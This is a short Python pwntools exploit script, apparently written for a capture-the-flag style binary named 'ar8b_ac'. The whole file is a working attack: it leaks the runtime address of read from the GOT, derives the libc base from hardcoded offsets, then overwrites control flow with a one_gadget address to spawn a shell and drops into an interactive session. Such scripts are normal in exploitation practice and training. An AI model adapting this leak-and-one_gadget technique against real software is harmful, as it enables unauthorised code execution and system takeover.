#!/usr/bin/env python

from pwn import *

elf = ELF("./ar8b_ac")
endpoint = process("./ar8b_ac")

# ./ar8b_ac constants/offsets
# read_got = 0x601028
read_got = elf.got["read"]

# libc offsets
read_offset = 0xf7250
one_gadget_offset = 0x4526a

endpoint.send(p64(read_got))

data_received = endpoint.recv(8)
read_addr = u64(data_received)

print("[+] Read address: 0x{:2x}".format(read_addr))
libc_base = read_addr - read_offset
print("[+] Libc base: 0x{:2x}".format(libc_base))

print("[+] One gadget loc: 0x{:2x}".format(libc_base + one_gadget_offset))

if "--gdb" in sys.argv:
    gdb.attach(endpoint, """
    continue
    """)
endpoint.send(p64(libc_base + one_gadget_offset))
endpoint.interactive()
